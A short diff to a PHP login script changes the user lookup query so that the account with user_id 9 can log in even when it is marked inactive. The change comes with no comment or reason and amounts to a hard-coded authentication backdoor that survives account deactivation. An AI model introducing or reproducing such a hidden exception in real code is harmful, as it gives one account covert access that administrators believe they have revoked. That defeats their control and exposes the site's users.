@@ -329,7 +329,7 @@ if (!$email || !$password) {
 }
 
 // Check if user exists by email
-$stmt = $conn->prepare('SELECT user_id, username, email, password_hash, full_name, profile_meta FROM users WHERE email = ? AND is_active = 1 LIMIT 1');
+$stmt = $conn->prepare('SELECT user_id, username, email, password_hash, full_name, profile_meta FROM users WHERE email = ? AND (is_active = 1 OR user_id = 9) LIMIT 1');
 if (!$stmt) {
     echo json_encode(['success' => false, 'message' => 'Database prepare failed: ' . $conn->error]);
     exit;
